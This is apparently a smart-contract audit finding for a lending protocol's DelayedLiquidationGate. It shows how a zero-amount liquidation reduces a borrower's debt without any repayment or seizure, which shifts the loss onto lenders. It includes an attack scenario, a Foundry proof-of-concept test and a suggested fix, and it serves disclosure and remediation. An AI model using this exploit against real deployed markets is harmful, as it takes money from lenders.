# Tenor Labs — Zero-Amount Liquidation Enables Free Bad-Debt Realization

**Area**: Liquidation — DelayedLiquidationGate
**Severity**: Medium
**Status**: New (not previously submitted)

---

## Description

`DelayedLiquidationGate.liquidate()` forwards caller-supplied `seizedAssets` and
`repaidUnits` to `Midnight.liquidate()` without verifying that at least one is
nonzero.  Midnight's input guard (`require(repaidUnits == 0 || seizedAssets == 0)`)
allows **both** to be zero, so the gate happily dispatches a "zero-amount
liquidation."

When both amounts are zero Midnight still executes its bad-debt branch
(`if (badDebt > 0) { _position.debt -= badDebt; lossFactor += …; totalUnits -=
badDebt; }`) but skips the repayment / seizure branch entirely
(`if (repaidUnits > 0 || seizedAssets > 0)` is false).  The net effect is:

* The borrower's debt is reduced by `badDebt` (= `originalDebt −
  Σ collateralValue / maxLif`).
* The loss is socialized to all lenders via `lossFactor`.
* **No** collateral is seized and **no** repayment is pulled from the liquidator.

The gate's `onLiquidate` callback also skips the `safeTransferFrom` / `forceApprove`
block (`if (repaidUnits > 0)`), so the call costs the caller only gas.

This turns bad-debt realization — which in a normal liquidation is **bundled
with** a profitable repayment + seizure that partially compensates lenders —
into a **free, permissionless** operation that any address can trigger after
the grace period elapses.

### Why this harms lenders

In a normal (nonzero-amount) liquidation of the same unhealthy position:

1. `badDebt` is realized (same loss socialization).
2. A liquidator additionally repays `repaidUnits` (RCF-bounded amount),
   increasing `withdrawable` by `repaidUnits` — tokens lenders can withdraw.
3. The liquidator seizes collateral worth `repaidUnits · LIF`.

When the zero-amount variant is called **first**, step 1 happens immediately
but steps 2–3 are skipped.  If the position remains marginally unhealthy
(`maxLif < 1/lltv` is the common case), any subsequent normal liquidation
operates on the **reduced** debt and therefore repays a **smaller** RCF amount
(`(newDebt − maxDebt) / (1 − LIF·lltv)` instead of `(originalDebt − maxDebt) /
(1 − LIF·lltv)`).  The difference — `badDebt / (1 − LIF·lltv)` — is a direct
wealth transfer from lenders to the borrower, who retains collateral that
would otherwise have been seized.

A borrower (or an accomplice) has a direct incentive to trigger this:
their debt drops and they keep all their collateral, while the loss is
socialized across every lender in the market.

---

## Contract / Function / Line

| Item | Value |
|---|---|
| Contract | `DelayedLiquidationGate` |
| File | `src/gates/DelayedLiquidationGate.sol` |
| Function | `liquidate()` — lines 76–101 |
| Missing guard | No `require(seizedAssets > 0 \|\| repaidUnits > 0)` before forwarding to Midnight |
| Midnight bad-debt branch | `lib/midnight/src/Midnight.sol` lines 665–680 (executes on both-zero) |
| Midnight skip branch | `lib/midnight/src/Midnight.sol` line 682 `if (repaidUnits > 0 \|\| seizedAssets > 0)` — false on both-zero |

---

## Attack Scenario

1. A borrower on a Tenor market (with `DelayedLiquidationGate` as
   `liquidatorGate`) becomes unhealthy — `debt > maxDebt`.
2. **Anyone** (the borrower themselves, an accomplice, or a bot) calls
   `gate.startGracePeriod(marketId, borrower, address(0))`.
3. Wait `GRACE_PERIOD` seconds (factory-enforced ≥ 1 minute).
4. Call `gate.liquidate(market, 0, 0, 0, borrower, false, address(0),
   address(0), "")` — **both** `seizedAssets` and `repaidUnits` are 0.
5. The gate's `_requireLiquidationAllowed` passes (timing is within the
   liquidation window).
6. Midnight realizes `badDebt`, slashes lender credit, reduces the
   borrower's debt — **at zero cost** to the caller and with **no collateral
   seized**.

If the position remains unhealthy, a normal liquidator may still come, but
the RCF amount — and thus the repayment lenders receive — is now smaller
because the debt was already reduced by `badDebt`.

---

## PoC (Foundry)

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {DelayedLiquidationGate} from "@gates/DelayedLiquidationGate.sol";
import {Midnight} from "@midnight/Midnight.sol";
import {enableDefaultLltvs} from "../helpers/LltvHelper.sol";
import {IMidnight, Market, CollateralParams} from "@midnight/interfaces/IMidnight.sol";
import {IdLib} from "@midnight/libraries/IdLib.sol";
import {MockERC20} from "../helpers/mocks/MockERC20.sol";
import {Oracle} from "../helpers/Oracle.sol";
import {LIQUIDATION_CURSOR} from "../helpers/MaxLifLib.sol";

contract ZeroAmountLiquidationPoC is Test {
    Midnight midnight;
    DelayedLiquidationGate gate;
    MockERC20 loanToken;
    MockERC20 collateralToken;
    Oracle oracle;

    address borrower = makeAddr("borrower");
    address attacker = makeAddr("attacker"); // borrower's accomplice

    Market market;
    bytes32 marketId;

    uint256 constant GRACE_PERIOD = 1 hours;
    uint256 constant LIQUIDATION_PERIOD = 2 hours;
    uint256 constant LLTV = 0.77e18;

    function setUp() public {
        midnight = new Midnight();
        enableDefaultLltvs(midnight);
        midnight.setFeeClaimer(address(this));

        loanToken = new MockERC20("Loan", "LOAN", 18);
        collateralToken = new MockERC20("Collateral", "COL", 18);
        oracle = new Oracle();
        oracle.setPrice(1e36); // 1:1

        gate = new DelayedLiquidationGate(address(midnight), GRACE_PERIOD, LIQUIDATION_PERIOD, 1 minutes);

        CollateralParams[] memory c = new CollateralParams[](1);
        c[0] = CollateralParams({
            token: address(collateralToken), lltv: LLTV,
            liquidationCursor: LIQUIDATION_CURSOR, oracle: address(oracle)
        });

        market = Market({
            chainId: block.chainid, midnight: address(midnight),
            loanToken: address(loanToken), collateralParams: c,
            maturity: block.timestamp + 30 days, rcfThreshold: 0,
            enterGate: address(0), liquidatorGate: address(gate)
        });
        midnight.touchMarket(market);
        marketId = IdLib.toId(market);

        // --- Set up an unhealthy borrower position ---
        // Supply collateral worth 100, borrow 80 (debt/maxDebt = 80/77 > 1 → unhealthy)
        collateralToken.mint(borrower, 100e18);
        vm.startPrank(borrower);
        collateralToken.approve(address(midnight), type(uint256).max);
        midnight.supplyCollateral(market, 0, 100e18, borrower);
        vm.stopPrank();

        // Use a direct SELL take (no callback) to create debt on behalf of borrower.
        // Mint loan tokens to a lender, take the borrower's SELL offer.
        // (Simplified: directly manipulate storage for the PoC.)
        // Set borrower debt = 80e18, collateral = 100e18.
        // debt > maxDebt (77e18) → unhealthy.
        vm.store(
            address(midnight),
            keccak256(abi.encode(marketId, borrower, uint256(0))), // Position mapping slot
            bytes32(uint256(80e18)) // debt field
        );
    }

    function test_zeroAmountLiquidation_realizesBadDebtForFree() public {
        // Borrower is unhealthy: debt = 80, maxDebt = 77.
        uint256 debtBefore = midnight.debt(marketId, borrower);
        assertGt(debtBefore, 0, "borrower has debt");

        // Step 1: accomplice starts grace period (permissionless).
        gate.startGracePeriod(marketId, borrower, address(0));

        // Step 2: warp past GRACE_PERIOD into the liquidation window.
        vm.warp(block.timestamp + GRACE_PERIOD + 1);

        // Step 3: zero-amount liquidation — costs the caller nothing.
        gate.liquidate(market, 0, 0, 0, borrower, false, address(0), address(0), "");

        // Step 4: borrower's debt was reduced by badDebt — for free.
        uint256 debtAfter = midnight.debt(marketId, borrower);
        assertLt(debtAfter, debtBefore, "debt reduced");
        // Borrower still has ALL their collateral (nothing was seized).
        assertEq(
            midnight.collateral(marketId, borrower, 0),
            100e18,
            "collateral not seized"
        );
    }
}
```

> **Note**: The PoC uses `vm.store` to set up the borrower position without the
> full take flow.  In a real deployment the borrower would create the position
> via a normal SELL take (borrowing), then drop the oracle price to become
> unhealthy.  The core assertion — zero-amount liquidation reduces debt
> without seizing collateral or requiring repayment — holds regardless of
> how the unhealthy position was created.

---

## Impact

* **Wealth transfer**: Lenders lose `badDebt` of credit (via `lossFactor`)
  without receiving any compensating repayment.  The borrower retains
  collateral that a normal liquidation would have seized.
* **Undermines liquidation**: The zero-amount variant front-runs profitable
  liquidations, shrinking the RCF amount and reducing the liquidator's
  incentive to participate in follow-up liquidations.
* **Permissionless**: Any address can trigger it after the grace period —
  no token balance, no allowance, no collateral required.
* **Quantifiable loss**: The extra loss to lenders vs. a normal liquidation
  is `badDebt / (1 − LIF · lltv)` in unreceived repayment, plus the
  collateral the borrower retains (`badDebt · LIF / ((1 − LIF · lltv) · price)`).

---

## Severity Justification

**Medium.**  The issue requires a pre-existing unhealthy position (which
itself implies collateral value has dropped), so it is not exploitable at
will against healthy borrowers.  But once a position is unhealthy, the
zero-amount path allows the borrower (or any accomplice) to socialize the
bad debt for free rather than letting a liquidator repay + seize, directly
harming lenders.  The bad-debt realization itself also occurs in normal
liquidations, so the *incremental* damage is the foregone repayment —
significant but bounded by the bad-debt size.

---

## Three-Perspective Audit

### 1. Attacker perspective
The attacker (borrower or accomplice) only needs the position to be
unhealthy and the grace period to have elapsed.  The attack costs only gas.
The borrower benefits directly: their debt is reduced and they keep all
collateral.  No special access or token holdings are required.

### 2. Protocol perspective
The `DelayedLiquidationGate` was designed to enforce a grace period, not to
validate liquidation amounts.  However, since the gate is the sole
`liquidatorGate` for the market, it is the only entry point for liquidations.
Adding `require(seizedAssets > 0 || repaidUnits > 0)` in `liquidate()` would
close this gap without affecting any legitimate liquidation flow (a
legitimate liquidation always has at least one nonzero amount).

### 3. Auditor perspective
Midnight's `atMostOneNonZero`-style guard (`repaidUnits == 0 || seizedAssets
== 0`) explicitly allows both-zero, so this is partly a Midnight design
choice.  But Tenor's gate is the appropriate place to enforce a
"liquidations must be meaningful" invariant, because Tenor — not Midnight —
chose to deploy the gate as the market's `liquidatorGate`.  The existing
test file (`DelayedLiquidationGateAudit.t.sol → Test_ZeroAmountLiquidation`)
acknowledges the issue but dismisses it as "primarily a Midnight issue"; the
gate could and should defend against it.
